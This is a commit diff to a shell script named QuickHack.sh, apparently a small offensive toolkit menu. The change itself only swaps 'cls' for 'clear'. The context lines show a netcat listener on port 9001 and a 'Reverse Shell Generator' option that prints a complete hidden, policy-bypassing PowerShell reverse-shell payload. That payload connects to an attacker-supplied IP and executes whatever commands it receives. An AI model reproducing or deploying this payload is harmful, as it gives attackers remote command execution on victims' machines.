70d6554c87776112ada74f1bb27e6983a3b2ed16
chill-c0der <99861040+chill-c0der2@users.noreply.github.com>
2022-12-08 10:07:24 -0800

    Update QuickHack.sh

--- QuickHack.sh
+++ QuickHack.sh
@@ -10,7 +10,7 @@ do
             netcat –lvnp 9001
             ;;
         "Reverse Shell Generator")
-            cls
+            clear
             echo powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('yourip', 9001);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
             echo change the ip adress in the payload
             read -p "Press [Enter] key to start backup..."
